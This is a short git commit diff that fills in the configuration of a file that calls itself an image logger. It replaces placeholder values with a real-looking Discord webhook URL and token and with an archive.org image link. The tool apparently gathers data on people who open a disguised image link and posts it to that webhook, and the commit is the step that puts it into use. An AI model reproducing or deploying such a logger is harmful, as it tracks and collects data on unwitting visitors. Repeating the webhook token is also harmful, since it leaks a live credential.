2a4d38ceac5cc88fc872b00955eb2624800db491
ewx12344 <milosagatonovic.ts@gmail.com>
2025-02-04 14:51:35 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1336332670938120273/AMiicmgzdK--nOrEIviQHvVoqk2rmU_0hCWTWqKLz1rzebqxjkQOA8S7sD5ICog0oTmd",
+    "image": "https://ia803404.us.archive.org/7/items/you-are-an-idiot-image/Thumbnails/youare%20inverted.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
